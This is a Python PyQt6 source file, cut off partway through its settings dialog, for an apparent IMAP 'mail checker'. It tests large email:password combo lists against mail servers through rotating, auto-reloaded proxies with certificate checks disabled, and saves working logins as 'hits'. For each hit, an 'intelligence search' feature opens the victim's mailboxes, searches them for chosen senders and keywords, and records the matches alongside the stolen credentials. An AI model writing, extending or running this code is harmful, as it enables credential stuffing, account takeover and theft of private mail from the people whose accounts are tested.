import sys
import os
import ssl
import re
import imaplib
import socket
import threading
import time
import configparser
from queue import Queue
from datetime import datetime, timedelta
from collections import deque, defaultdict
from concurrent.futures import ThreadPoolExecutor
import logging
import base64
import email
from email.header import decode_header
import gc

try:
    import socks
    SOCKS_AVAILABLE = True
except ImportError:
    SOCKS_AVAILABLE = False
    print("Warning: 'PySocks' library not found. SOCKS4/SOCKS5 proxy support will be disabled.")
    print("Please install it using: pip install PySocks")

try:
    from bs4 import BeautifulSoup
except ImportError:
    print("Warning: 'beautifulsoup4' library not found. HTML email parsing will be basic.")
    print("Please install it using: pip install beautifulsoup4")
    BeautifulSoup = None

from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QPushButton, QLineEdit, QLabel, QFileDialog, QMessageBox,
    QTableWidget, QTableWidgetItem, QHeaderView, QDialog,
    QFormLayout, QSpinBox, QTabWidget, QStatusBar, QDialogButtonBox,
    QMenu, QTextEdit, QCheckBox, QGroupBox, QComboBox, QFrame,
    QSplitter, QListWidget, QListWidgetItem, QProgressBar
)
from PyQt6.QtCore import QThread, pyqtSignal, QObject, Qt, QSettings, QTimer
from PyQt6.QtGui import QFont, QColor, QBrush, QTextCursor

logging.basicConfig(level=logging.WARNING,
                    format='%(asctime)s - %(levelname)s - %(message)s',
                    handlers=[logging.FileHandler("mail_checker_debug.log", mode='w', encoding='utf-8')])

def create_default_domains_ini():
    if not os.path.exists('domains.ini'):
        config = configparser.ConfigParser()
        config['DEFAULT'] = {'server': 'imap.default.com', 'port': '993'}
        config['gmail.com'] = {'server': 'imap.gmail.com', 'port': '993'}
        config['yahoo.com'] = {'server': 'imap.mail.yahoo.com', 'port': '993'}
        config['outlook.com'] = {'server': 'outlook.office365.com', 'port': '993'}
        config['hotmail.com'] = {'server': 'outlook.office365.com', 'port': '993'}
        config['aol.com'] = {'server': 'imap.aol.com', 'port': '993'}
        config['icloud.com'] = {'server': 'imap.mail.me.com', 'port': '993'}
        with open('domains.ini', 'w', encoding='utf-8') as configfile:
            config.write(configfile)
        logging.info("Default 'domains.ini' created.")

def create_default_blacklist():
    if not os.path.exists('blacklist.txt'):
        with open('blacklist.txt', 'w', encoding='utf-8') as f:
            f.write("# Add domains to blacklist (one per line)\n")
            f.write("# Example:\n")
            f.write("# example.com\n")
            f.write("# spam-domain.com\n")
        logging.info("Default 'blacklist.txt' created.")

def decode_mime_header(header):
    if header is None:
        return ""
    decoded_parts = decode_header(header)
    parts = []
    for part, charset in decoded_parts:
        if isinstance(part, bytes):
            try:
                parts.append(part.decode(charset or 'utf-8', errors='ignore'))
            except (LookupError, TypeError):
                parts.append(part.decode('utf-8', errors='ignore'))
        else:
            parts.append(str(part))
    return "".join(parts)

def parse_email_body(msg):
    body = ""
    if msg.is_multipart():
        for part in msg.walk():
            content_type = part.get_content_type()
            content_disposition = str(part.get("Content-Disposition"))
            
            if content_type in ["text/plain", "text/html"] and "attachment" not in content_disposition:
                try:
                    payload = part.get_payload(decode=True)
                    charset = part.get_content_charset() or 'utf-8'
                    part_body = payload.decode(charset, errors='replace')
                    if content_type == "text/html" and BeautifulSoup:
                        soup = BeautifulSoup(part_body, "html.parser")
                        body += soup.get_text()
                    else:
                        body += part_body
                    body += "\n"
                except Exception:
                    continue
    else:
        try:
            payload = msg.get_payload(decode=True)
            charset = msg.get_content_charset() or 'utf-8'
            body = payload.decode(charset, errors='replace')
            if msg.get_content_type() == "text/html" and BeautifulSoup:
                soup = BeautifulSoup(body, "html.parser")
                body = soup.get_text()
        except Exception as e:
            body = f"[Could not decode body: {e}]"
    return body

def count_lines_fast(file_path):
    count = 0
    try:
        with open(file_path, 'rb') as f:
            for _ in f:
                count += 1
    except:
        count = 0
    return count

def load_blacklist_from_file(file_path):
    blacklist = set()
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line in f:
                    domain = line.strip().lower()
                    if domain and not domain.startswith('#'):
                        blacklist.add(domain)
            logging.info(f"Loaded {len(blacklist)} domains from blacklist")
            return blacklist
        except Exception as e:
            logging.error(f"Failed to load blacklist from {file_path}: {e}")
    return blacklist

class WorkerSignals(QObject):
    progress = pyqtSignal(int, int, int, int, int)
    log = pyqtSignal(str, QColor)
    finished = pyqtSignal(dict, float, int)
    cpm = pyqtSignal(int)
    add_hit = pyqtSignal(str, str)
    add_invalid = pyqtSignal(str, str)
    add_error = pyqtSignal(str, str)
    add_intelligence_hit = pyqtSignal(str, str, str, str, list)
    blacklisted = pyqtSignal(int)
    save_working_servers = pyqtSignal(dict)

class CheckerWorker(QObject):
    def __init__(self, settings):
        super().__init__()
        self.settings = settings
        self.is_running = True
        self.is_paused = False
        self.stats = {'hits': 0, 'invalids': 0, 'errors': 0, 'checked': 0, 'keyword_hits': 0, 'blacklisted': 0}
        
        self.session_folder = self.create_session_folder()
        
        self.settings['hits_file'] = os.path.join(self.session_folder, 'hits.txt')
        self.settings['invalids_file'] = os.path.join(self.session_folder, 'invalids.txt')
        self.settings['errors_file'] = os.path.join(self.session_folder, 'errors.txt')
        self.settings['intelligence_hits_file'] = os.path.join(self.session_folder, 'intelligence_hits.txt')
        self.settings['intelligence_results_folder'] = os.path.join(self.session_folder, 'intelligence_results')
        
        self.combo_file_path = None
        self.proxies = []
        self.blacklist = set()
        
        self.signals = WorkerSignals()
        self.domain_mappings = self.settings.get('domain_mappings', {})
        
        self.multi_domain_mappings = defaultdict(list)
        self._build_multi_domain_mappings()
        
        self.working_servers = {}
        self.working_servers_lock = threading.Lock()
        
        self.start_time = 0
        self.checks_in_last_minute = deque(maxlen=1000)
        self._progress_counter = 0
        self.stats_lock = threading.Lock()
        
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
        self.use_proxies = settings.get('use_proxies', False)
        self.proxy_type = settings.get('proxy_type', 'HTTP/HTTPS')
        
        self.auto_reload_proxies = settings.get('auto_reload_proxies', False)
        self.proxy_reload_url = settings.get('proxy_reload_url', '')
        self.proxy_reload_lock = threading.Lock()
        self.blocked_proxies = set()
        self.min_proxies_threshold = 10
        
        self.max_retries = 1

    def create_session_folder(self):
        base_folder = "Results"
        os.makedirs(base_folder, exist_ok=True)
        
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        session_folder = os.path.join(base_folder, timestamp)
        os.makedirs(session_folder, exist_ok=True)
        
        intelligence_folder = os.path.join(session_folder, "intelligence_results")
        os.makedirs(intelligence_folder, exist_ok=True)
        
        logging.info(f"Created session folder: {session_folder}")
        return session_folder

    def _build_multi_domain_mappings(self):
        for domain, mapping in self.domain_mappings.items():
            self.multi_domain_mappings[domain].append({
                'server': mapping['server'],
                'port': mapping['port']
            })

    def get_imap_server(self, domain):
        if domain in self.domain_mappings:
            mapping = self.domain_mappings[domain]
            return mapping['server'], mapping['port']
        
        common_patterns = {
            'gmail.com': ('imap.gmail.com', 993),
            'yahoo.com': ('imap.mail.yahoo.com', 993),
            'outlook.com': ('outlook.office365.com', 993),
            'hotmail.com': ('outlook.office365.com', 993),
            'live.com': ('outlook.office365.com', 993),
            'aol.com': ('imap.aol.com', 993),
            'icloud.com': ('imap.mail.me.com', 993),
        }
        
        if domain in common_patterns:
            return common_patterns[domain]
        
        return f"imap.{domain}", 993

    def get_all_imap_servers(self, domain):
        servers = []
        
        if domain in self.multi_domain_mappings:
            servers.extend(self.multi_domain_mappings[domain])
        
        common_patterns = {
            'gmail.com': [('imap.gmail.com', 993)],
            'yahoo.com': [('imap.mail.yahoo.com', 993)],
            'outlook.com': [('outlook.office365.com', 993)],
            'hotmail.com': [('outlook.office365.com', 993)],
            'live.com': [('outlook.office365.com', 993)],
            'aol.com': [('imap.aol.com', 993)],
            'icloud.com': [('imap.mail.me.com', 993)],
        }
        
        if domain in common_patterns and not servers:
            servers.extend([{'server': s, 'port': p} for s, p in common_patterns[domain]])
        
        default_server = f"imap.{domain}"
        has_default = any(s['server'] == default_server for s in servers)
        
        if not has_default:
            servers.append({'server': default_server, 'port': 993})
        
        if not servers:
            servers.append({'server': default_server, 'port': 993})
        
        return servers

    def save_working_server(self, domain, working_server, port):
        with self.working_servers_lock:
            self.working_servers[domain] = working_server
            self.signals.log.emit(
                f"Working server: {domain} -> {working_server}:{port}", 
                QColor("#00bcd4")
            )

    def setup_proxy(self, proxy_string):
        if not self.use_proxies or not proxy_string:
            if hasattr(socket, '_original_socket'):
                socket.socket = socket._original_socket
            return True
            
        try:
            parts = proxy_string.strip().split(':')
            if len(parts) < 2:
                return False
                
            proxy_host = parts[0]
            proxy_port = int(parts[1])
            proxy_username = parts[2] if len(parts) > 2 else self.settings.get('proxy_username', '')
            proxy_password = parts[3] if len(parts) > 3 else self.settings.get('proxy_password', '')
            
            if self.proxy_type in ['SOCKS4', 'SOCKS5']:
                if not SOCKS_AVAILABLE:
                    return False
                
                if not hasattr(socket, '_original_socket'):
                    socket._original_socket = socket.socket
                
                proxy_type_map = {
                    'SOCKS4': socks.SOCKS4,
                    'SOCKS5': socks.SOCKS5
                }
                
                socks.set_default_proxy(
                    proxy_type_map[self.proxy_type],
                    proxy_host,
                    proxy_port,
                    True,
                    proxy_username if proxy_username else None,
                    proxy_password if proxy_password else None
                )
                socket.socket = socks.socksocket
            
            return True
            
        except Exception as e:
            logging.error(f"Failed to setup proxy {proxy_string}: {e}")
            if hasattr(socket, '_original_socket'):
                socket.socket = socket._original_socket
            return False

    def stop(self):
        self.is_running = False

    def toggle_pause(self):
        self.is_paused = not self.is_paused

    def is_blacklisted(self, email):
        try:
            domain = email.split('@')[1].lower()
            return domain in self.blacklist
        except:
            return False

    def load_proxies_from_url(self):
        if not self.proxy_reload_url:
            return []
        
        try:
            import urllib.request
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            self.signals.log.emit(f"Loading proxies from: {self.proxy_reload_url[:50]}...", QColor("#00bcd4"))
            
            with urllib.request.urlopen(self.proxy_reload_url, context=ctx, timeout=15) as response:
                content = response.read().decode('utf-8')
                
                new_proxies = [line.strip() for line in content.split('\n') if line.strip() and ':' in line]
                
                self.signals.log.emit(f"Loaded {len(new_proxies)} new proxies", QColor("#4ade80"))
                return new_proxies
                
        except Exception as e:
            self.signals.log.emit(f"Failed to load proxies: {str(e)[:50]}", QColor("#f44336"))
            logging.error(f"Proxy reload error: {e}")
            return []
    
    def reload_proxies_if_needed(self):
        if not self.auto_reload_proxies or not self.proxy_reload_url:
            return
        
        with self.proxy_reload_lock:
            active_proxies = len([p for p in self.proxies if p not in self.blocked_proxies])
            
            if active_proxies < self.min_proxies_threshold:
                self.signals.log.emit(
                    f"Low proxies ({active_proxies} left) - Reloading...", 
                    QColor("#ff9800")
                )
                
                new_proxies = self.load_proxies_from_url()
                
                if new_proxies:
                    self.proxies.extend(new_proxies)
                    self.proxies = [p for p in self.proxies if p not in self.blocked_proxies]
                    self.blocked_proxies.clear()
                    
                    self.signals.log.emit(
                        f"Proxies reloaded! Now: {len(self.proxies)} proxies", 
                        QColor("#4ade80")
                    )
    
    def mark_proxy_as_blocked(self, proxy):
        if not proxy:
            return
        
        with self.proxy_reload_lock:
            self.blocked_proxies.add(proxy)
            
            active_proxies = len([p for p in self.proxies if p not in self.blocked_proxies])
            
            self.signals.log.emit(
                f"Proxy blocked: {proxy} ({active_proxies} left)", 
                QColor("#ff6b6b")
            )
            
            if active_proxies < self.min_proxies_threshold:
                self.reload_proxies_if_needed()

    def try_imap_connection_with_custom_timeout(self, email_addr, password, server, port, use_ssl=True, timeout=5):
        """IMAP connection with custom timeout parameter"""
        if not self.is_running:
            return False, None, 'stopped'
        
        imap_conn = None
        try:
            if use_ssl:
                imap_conn = imaplib.IMAP4_SSL(
                    host=server, 
                    port=port, 
                    ssl_context=self.ssl_context, 
                    timeout=timeout
                )
            else:
                imap_conn = imaplib.IMAP4(
                    host=server, 
                    port=port
                )
                imap_conn.sock.settimeout(timeout)
            
            if not self.is_running:
                try:
                    imap_conn.logout()
                except:
                    pass
                return False, None, 'stopped'
            
            typ, data = imap_conn.login(email_addr, password)
            
            if typ == 'OK':
                return True, imap_conn, None
            else:
                try:
                    imap_conn.logout()
                except:
                    pass
                return False, None, 'invalid'
                
        except (imaplib.IMAP4.error, imaplib.IMAP4.abort) as e:
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, 'invalid'
            
        except (socket.timeout, TimeoutError) as e:
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, 'timeout'
            
        except (ConnectionRefusedError, socket.gaierror, OSError) as e:
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, 'connection_failed'
            
        except Exception as e:
            if imap_conn:
                try:
                    imap_conn.logout()
                except:
                    pass
            return False, None, str(e)[:30]

    def try_imap_connection_with_retry(self, email_addr, password, server, port, use_ssl=True):
        """Intelligent adaptive timeout retry"""
        attempts = 0
        last_error = None
        base_timeout = self.settings['timeout']
        
        while attempts <= self.max_retries:
            if not self.is_running:
                return False, None, 'stopped'
            
            if attempts == 0:
                timeout_to_use = max(5, min(base_timeout * 0.5, 8))
            else:
                timeout_to_use = base_timeout
            
            success, conn, error_type = self.try_imap_connection_with_custom_timeout(
                email_addr, password, server, port, use_ssl, timeout_to_use
            )
            
            if success:
                return True, conn, None
            
            if error_type == 'invalid':
                return False, None, 'invalid'
            
            if error_type in ['timeout', 'connection_failed'] and attempts < self.max_retries:
                attempts += 1
                time.sleep(0.3)
                last_error = error_type
                continue
            
            return False, None, error_type or last_error
        
        return False, None, last_error
        
    def check_single_combo(self, combo):
        if not self.is_running:
            return None
            
        try:
            email_addr, password = combo.strip().split(self.settings['delimiter'])
            
            if self.is_blacklisted(email_addr):
                combo_str = f"{email_addr}:{password}"
                return {'status': 'blacklisted', 'combo': combo_str, 'domain': email_addr.split('@')[1]}
            
            domain = email_addr.split('@')[1]
            servers = self.get_all_imap_servers(domain)
            combo_str = f"{email_addr}:{password}"
            
            current_proxy = None
            if self.use_proxies and self.proxies:
                import random
                
                active_proxies = [p for p in self.proxies if p not in self.blocked_proxies]
                
                if not active_proxies:
                    self.reload_proxies_if_needed()
                    active_proxies = [p for p in self.proxies if p not in self.blocked_proxies]
                
                if active_proxies:
                    current_proxy = random.choice(active_proxies)
                    self.setup_proxy(current_proxy)
            
            success = False
            imap_conn = None
            error_type = None
            working_server = None
            
            for server_info in servers:
                server = server_info['server']
                
                success, imap_conn, error_type = self.try_imap_connection_with_retry(
                    email_addr, password, server, 993, use_ssl=True
                )
                
                if success:
                    working_server = server
                    break
                
                if error_type == 'invalid':
                    break
                
                if error_type == 'stopped':
                    return None
            
            if not success and error_type in ['connection_failed', 'timeout'] and current_proxy and self.auto_reload_proxies:
                active_proxies = [p for p in self.proxies if p not in self.blocked_proxies and p != current_proxy]
                if active_proxies:
                    test_proxy = random.choice(active_proxies)
                    self.setup_proxy(test_proxy)
                    
                    for server_info in servers:
                        server = server_info['server']
                        
                        test_success, test_conn, test_error = self.try_imap_connection_with_retry(
                            email_addr, password, server, 993, use_ssl=True
                        )
                        
                        if test_success:
                            self.mark_proxy_as_blocked(current_proxy)
                            working_server = server
                            
                            self.save_working_server(domain, working_server, 993)
                            
                            # Close connection immediately if intelligence search is disabled
                            if not self.settings.get('intelligence_search_enabled', False):
                                try:
                                    test_conn.logout()
                                    test_conn = None
                                except:
                                    pass
                            
                            return {
                                'status': 'hit', 
                                'combo': combo_str, 
                                'details': f'{server}:993 [SSL]',
                                'imap_conn': test_conn,
                                'email': email_addr
                            }
                        
                        if test_error == 'invalid':
                            break
                    
                    if test_conn and not test_success:
                        try:
                            test_conn.logout()
                        except:
                            pass
            
            if success:
                self.save_working_server(domain, working_server, 993)
                
                # Close connection immediately if intelligence search is disabled
                if not self.settings.get('intelligence_search_enabled', False):
                    try:
                        imap_conn.logout()
                        imap_conn = None
                    except:
                        pass
                
                return {
                    'status': 'hit', 
                    'combo': combo_str, 
                    'details': f'{working_server}:993 [SSL]',
                    'imap_conn': imap_conn,
                    'email': email_addr
                }
            
            if error_type == 'stopped':
                return None
            
            if error_type == 'invalid':
                return {'status': 'invalid', 'combo': combo_str, 'reason': 'Invalid credentials'}
            
            if not success and error_type in ['timeout', 'connection_failed']:
                for server_info in servers:
                    server = server_info['server']
                    
                    success, imap_conn, error_type = self.try_imap_connection_with_retry(
                        email_addr, password, server, 143, use_ssl=False
                    )
                    
                    if success:
                        working_server = server
                        
                        self.save_working_server(domain, working_server, 143)
                        
                        # Close connection immediately if intelligence search is disabled
                        if not self.settings.get('intelligence_search_enabled', False):
                            try:
                                imap_conn.logout()
                                imap_conn = None
                            except:
                                pass
                        
                        return {
                            'status': 'hit', 
                            'combo': combo_str, 
                            'details': f'{server}:143 [Plain]',
                            'imap_conn': imap_conn,
                            'email': email_addr
                        }
                    
                    if error_type == 'invalid':
                        return {'status': 'invalid', 'combo': combo_str, 'reason': 'Invalid credentials'}
                    
                    if error_type == 'stopped':
                        return None
            
            error_messages = {
                'timeout': 'Connection timeout (retried)',
                'connection_failed': 'Connection refused (retried)',
                'invalid': 'Invalid credentials'
            }
            
            return {
                'status': 'error', 
                'combo': combo_str, 
                'reason': error_messages.get(error_type, f'Error: {error_type}')
            }
                
        except ValueError:
            return {'status': 'error', 'combo': combo, 'reason': 'Malformed combo'}
        except Exception as e:
            return {'status': 'error', 'combo': combo, 'reason': str(e)[:50]}

    def process_result(self, result, hits_file, invalids_file, intelligence_file, errors_file):
        if result is None:
            return
        
        with self.stats_lock:
            self.stats['checked'] += 1
            
            if result['status'] == 'blacklisted':
                self.stats['blacklisted'] += 1
            elif result['status'] == 'hit':
                self.stats['hits'] += 1
            elif result['status'] == 'invalid':
                self.stats['invalids'] += 1
            elif result['status'] == 'error':
                self.stats['errors'] += 1
        
        if result['status'] == 'blacklisted':
            self.signals.blacklisted.emit(self.stats['blacklisted'])
            self.signals.log.emit(f"BLACKLISTED -> {result['combo']} [{result['domain']}]", QColor("#ff6b6b"))
            
        elif result['status'] == 'hit':
            hits_file.write(result['combo'] + '\n')
            hits_file.flush()
            self.signals.log.emit(f"HIT -> {result['combo']} | {result.get('details', 'Valid')}", QColor("#4ade80"))
            self.signals.add_hit.emit(result['combo'], result.get('details', 'Valid'))
            
            imap_conn = result.get('imap_conn')
            email_addr = result.get('email')
            
            # Fix: Extract password from combo instead of using self.current_password
            if self.settings.get('intelligence_search_enabled', False) and imap_conn and email_addr:
                try:
                    # Extract password from combo string
                    password = result['combo'].split(':', 1)[1] if ':' in result['combo'] else ''
                    self.search_inbox_safe(imap_conn, email_addr, password, intelligence_file)
                except Exception as e:
                    logging.error(f"Intelligence search error for {email_addr}: {e}")
                finally:
                    try:
                        imap_conn.logout()
                    except:
                        pass
            
        elif result['status'] == 'invalid':
            invalids_file.write(result['combo'] + '\n')
            if self.stats['invalids'] % 100 == 0:
                invalids_file.flush()
            self.signals.add_invalid.emit(result['combo'], result.get('reason', 'Invalid'))
            
        elif result['status'] == 'error':
            errors_file.write(f"{result['combo']}\n")
            if self.stats['errors'] % 50 == 0:
                errors_file.flush()
            
            self.signals.add_error.emit(result['combo'], result.get('reason', 'Error'))
        
        self.checks_in_last_minute.append(time.monotonic())
        
        self._progress_counter += 1
        if self._progress_counter >= 25:
            with self.stats_lock:
                self.signals.progress.emit(
                    self.stats['checked'], 
                    self.stats['hits'], 
                    self.stats['invalids'], 
                    self.stats['errors'],
                    self.stats['keyword_hits']
                )
            self._progress_counter = 0
            
            now = time.monotonic()
            cutoff = now - 60
            
            while self.checks_in_last_minute and self.checks_in_last_minute[0] < cutoff:
                self.checks_in_last_minute.popleft()
            
            self.signals.cpm.emit(len(self.checks_in_last_minute))

    def _build_nested_or_query(self, criteria):
        if not criteria:
            return "(ALL)"
        if len(criteria) == 1:
            return criteria[0]
        
        return f"(OR {criteria[0]} {self._build_nested_or_query(criteria[1:])})"

    def search_inbox_safe(self, imap_server, email_addr, password, intelligence_file):
        if not self.is_running:
            return
        
        try:
            senders = [s.strip() for s in self.settings['intelligence_senders'].split('\n') if s.strip()]
            keywords = [k.strip() for k in self.settings['intelligence_keywords'].split('\n') if k.strip()]
            
            search_in_subject = self.settings['search_in_subject']
            search_in_body = self.settings['search_in_body']
            
            if not any([senders, keywords]):
                return
            
            search_parts = []
            if senders:
                search_parts.extend([f'(FROM "{s}")' for s in senders])
            
            if keywords:
                if search_in_subject:
                    search_parts.extend([f'(SUBJECT "{k}")' for k in keywords])
                if search_in_body:
                    search_parts.extend([f'(BODY "{k}")' for k in keywords])

            if not search_parts or not self.is_running:
                return

            search_query = self._build_nested_or_query(search_parts)
            fetch_count = self.settings['intelligence_emails_to_fetch']

            for mailbox in self.settings['intelligence_mailboxes'].split(','):
                if not self.is_running:
                    break
                
                try:
                    status, data = imap_server.select(f'"{mailbox.strip()}"', readonly=True)
                    
                    if status != 'OK':
                        self.signals.log.emit(
                            f"Mailbox not found: {mailbox.strip()}", 
                            QColor("#ff9800")
                        )
                        continue
                    
                    if not self.is_running:
                        break
                    
                    typ, data = imap_server.search(None, search_query)
                    if typ != 'OK' or not data[0]:
                        continue
                    
                    uids = data[0].split()
                    fetched_emails_for_account = defaultdict(list)

                    for uid in uids[-fetch_count:]:
                        if not self.is_running:
                            break
                        
                        try:
                            typ, msg_data = imap_server.fetch(uid, '(RFC822)')
                            if typ != 'OK':
                                continue
                            
                            raw_email = msg_data[0][1]
                            email_message = email.message_from_bytes(raw_email)
                            
                            subject = decode_mime_header(email_message['Subject'])
                            from_ = decode_mime_header(email_message['From'])
                            date_ = decode_mime_header(email_message['Date'])
                            
                            body = parse_email_body(email_message)
                            if len(body) > 50000:
                                body = body[:50000] + "... [truncated]"

                            email_content = {
                                'subject': subject, 
                                'from': from_, 
                                'date': date_, 
                                'body': body,
                                'headers': "".join(f"{k}: {v}\n" for k, v in list(email_message.items())[:20])
                            }
                            
                            for sender in senders:
                                if sender.lower() in from_.lower():
                                    fetched_emails_for_account[sender].append(email_content)
                            
                            for keyword in keywords:
                                if (search_in_subject and keyword.lower() in subject.lower()) or \
                                   (search_in_body and keyword.lower() in body.lower()):
                                    fetched_emails_for_account[keyword].append(email_content)
                        
                        except Exception as e:
                            logging.error(f"Failed to process email UID {uid}: {e}")
                            continue
                    
                    if fetched_emails_for_account and self.is_running:
                        with self.stats_lock:
                            self.stats['keyword_hits'] += 1
                        
                        for match_detail, details_list in fetched_emails_for_account.items():
                            if not self.is_running:
                                break
                            
                            match_type = "Sender" if match_detail in senders else "Keyword"
                            
                            unique_details = []
                            seen = set()
                            for d in details_list:
                                key = (d['subject'], d['from'], d['date'])
                                if key not in seen:
                                    seen.add(key)
                                    unique_details.append(d)
                            
                            if len(unique_details) > 50:
                                self.signals.log.emit(
                                    f"Too many matches ({len(unique_details)}), limiting to 50", 
                                    QColor("#ff9800")
                                )
                                unique_details = unique_details[:50]
                            
                            safe_filename = re.sub(r'[<>:"/\\|?*]', '_', match_detail)
                            
                            output_filename = os.path.join(
                                self.settings['intelligence_results_folder'],
                                f"{safe_filename}.txt"
                            )
                            
                            try:
                                # Fix: Use password parameter instead of self.current_password
                                combo_str = f"{email_addr}:{password}"
                                
                                with open(output_filename, 'a', encoding='utf-8') as f:
                                    f.write(f"{combo_str} | {len(unique_details)} messages\n")
                                
                                self.signals.log.emit(
                                    f"Intelligence: {combo_str} -> {match_detail} ({len(unique_details)} msgs)", 
                                    QColor("cyan")
                                )
                            except Exception as e:
                                logging.error(f"Failed to save to {output_filename}: {e}")
                            
                            self.signals.add_intelligence_hit.emit(
                                email_addr, 
                                match_type, 
                                match_detail, 
                                mailbox.strip(), 
                                unique_details
                            )
                            
                            intelligence_file.write(
                                f"{email_addr}|{match_type}|{match_detail}|{mailbox.strip()}|{len(unique_details)}\n"
                            )
                            intelligence_file.flush()

                except imaplib.IMAP4.error as e:
                    logging.error(f"IMAP error in mailbox {mailbox}: {e}")
                    continue
                except Exception as e:
                    logging.error(f"Unexpected error in mailbox {mailbox}: {e}")
                    continue
                    
        except Exception as e:
            logging.error(f"Intelligence search failed for {email_addr}: {e}")

    def run(self):
        self.start_time = time.time()
        executor = None
        hits_file = None
        invalids_file = None
        intelligence_file = None
        errors_file = None
        
        try:
            max_workers = self.settings['threads']
            
            hits_file = open(self.settings['hits_file'], 'w', encoding='utf-8', buffering=8192)
            invalids_file = open(self.settings['invalids_file'], 'w', encoding='utf-8', buffering=8192)
            intelligence_file = open(self.settings['intelligence_hits_file'], 'w', encoding='utf-8', buffering=8192)
            errors_file = open(self.settings['errors_file'], 'w', encoding='utf-8', buffering=8192)
            
            try:
                executor = ThreadPoolExecutor(max_workers=max_workers)
                
                active_futures = {}
                max_queue_size = max_workers * 6
                
                try:
                    with open(self.combo_file_path, 'r', encoding='utf-8', errors='ignore') as combo_file:
                        combo_iterator = iter(combo_file)
                        submitting = True
                        
                        while submitting or active_futures:
                            if not self.is_running:
                                for future in list(active_futures.keys()):
                                    future.cancel()
                                active_futures.clear()
                                break
                            
                            while self.is_paused:
                                time.sleep(0.1)
                                if not self.is_running:
                                    break
                            
                            if not self.is_running:
                                break
                            
                            while submitting and len(active_futures) < max_queue_size:
                                if not self.is_running:
                                    break
                                
                                try:
                                    line = next(combo_iterator)
                                    line = line.strip()
                                    if line:
                                        future = executor.submit(self.check_single_combo, line)
                                        active_futures[future] = line
                                except StopIteration:
                                    submitting = False
                                    break
                                except Exception as e:
                                    logging.error(f"Submit error: {e}")
                                    break
                            
                            done_futures = [f for f in list(active_futures.keys()) if f.done()]
                            
                            for future in done_futures:
                                try:
                                    result = future.result(timeout=0.01)
                                    if result is not None:
                                        self.process_result(result, hits_file, invalids_file, intelligence_file, errors_file)
                                except Exception as e:
                                    if self.is_running:
                                        logging.error(f"Result error: {e}")
                                finally:
                                    active_futures.pop(future, None)
                            
                            if not done_futures and active_futures:
                                time.sleep(0.01)
                
                except Exception as e:
                    logging.error(f"File reading error: {e}")
            
            finally:
                if executor:
                    try:
                        if sys.version_info >= (3, 9):
                            executor.shutdown(wait=False, cancel_futures=True)
                        else:
                            executor.shutdown(wait=False)
                    except Exception as e:
                        logging.error(f"Executor shutdown error: {e}")
                    
        except Exception as e:
            logging.error(f"Worker critical error: {e}")
        finally:
            try:
                if hits_file:
                    hits_file.close()
                if invalids_file:
                    invalids_file.close()
                if intelligence_file:
                    intelligence_file.close()
                if errors_file:
                    errors_file.close()
            except:
                pass
            
            with self.stats_lock:
                self.signals.progress.emit(
                    self.stats['checked'], 
                    self.stats['hits'], 
                    self.stats['invalids'], 
                    self.stats['errors'],
                    self.stats['keyword_hits']
                )
            
            elapsed_time = time.time() - self.start_time
            final_cpm = int((self.stats['checked'] / elapsed_time) * 60) if elapsed_time > 0 else 0
            
            if self.working_servers:
                self.signals.save_working_servers.emit(dict(self.working_servers))
            
            self.signals.finished.emit(self.stats, elapsed_time, final_cpm)
            
class SettingsDialog(QDialog):
    def __init__(self, settings_manager, parent=None):
        super().__init__(parent)
        self.settings_manager = settings_manager
        self.setWindowTitle("Settings")
        self.setMinimumWidth(600)
        self.setStyleSheet("""
            QDialog {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:1,
                    stop:0 #0f0f0f, stop:1 #1a1a1a);
            }
            QLabel {
                color: #d4d4d4;
                font-size: 11pt;
                font-weight: 500;
            }
            QSpinBox, QLineEdit, QComboBox, QTextEdit {
                background: rgba(64, 64, 64, 0.3);
                color: #d4d4d4;
                border: 2px solid #404040;
                border-radius: 8px;
                padding: 10px;
                font-size: 10pt;
            }
            QSpinBox:focus, QLineEdit:focus, QComboBox:focus, QTextEdit:focus {
                border: 2px solid #737373;
                background: rgba(64, 64, 64, 0.5);
            }
            QCheckBox {
                color: #d4d4d4;
                font-size: 11pt;
            }
            QCheckBox::indicator {
                width: 20px;
                height: 20px;
                border-radius: 6px;
                border: 2px solid #525252;
                background: rgba(64, 64, 64, 0.3);
            }
            QCheckBox::indicator:checked {
                background: #a3a3a3;
                border: 2px solid #a3a3a3;
            }
            QTabWidget::pane {
                border: 2px solid #404040;
                border-radius: 8px;
                background: rgba(26, 26, 26, 0.5);
            }
            QTabBar::tab {
                background: rgba(64, 64, 64, 0.3);
                color: #737373;
                padding: 10px 20px;
                border-radius: 8px;
                margin-right: 5px;
            }
            QTabBar::tab:selected {
                background: #525252;
                color: #d4d4d4;
            }
            QGroupBox {
                border: 2px solid rgba(115, 115, 115, 0.3);
                border-radius: 8px;
                margin-top: 10px;
                padding-top: 10px;
                font-weight: bold;
            }
            QGroupBox::title {
                subcontrol-origin: margin;
                left: 10px;
                padding: 0 5px;
            }
        """)
        
        self.layout = QVBoxLayout(self)
        
        tabs = QTabWidget()
        self.layout.addWidget(tabs)
        
        general_tab = QWidget()
        proxy_tab = QWidget()
        intelligence_tab = QWidget()

        tabs.addTab(general_tab, "General")
        tabs.addTab(proxy_tab, "Proxy")
        tabs.addTab(intelligence_tab, "Intelligence Search")

        self.init_general_tab(general_tab)
        self.init_proxy_tab(proxy_tab)
        self.init_intelligence_tab(intelligence_tab)
        
        self.buttons = QDialogButtonBox(QDialogButtonBox.StandardButton.Ok | QDialogButtonBox.StandardButton.Cancel)
        self.buttons.button(QDialogButtonBox.StandardButton.Ok).setStyleSheet("""
            QPushButton {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                    stop:0 #525252, stop:1 #737373);
                color: white;
                border: none;
                border-radius: 8px;
                padding: 12px 30px;
                font-weight: bold;
                font-size: 10pt;
            }
            QPushButton:hover {
                background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
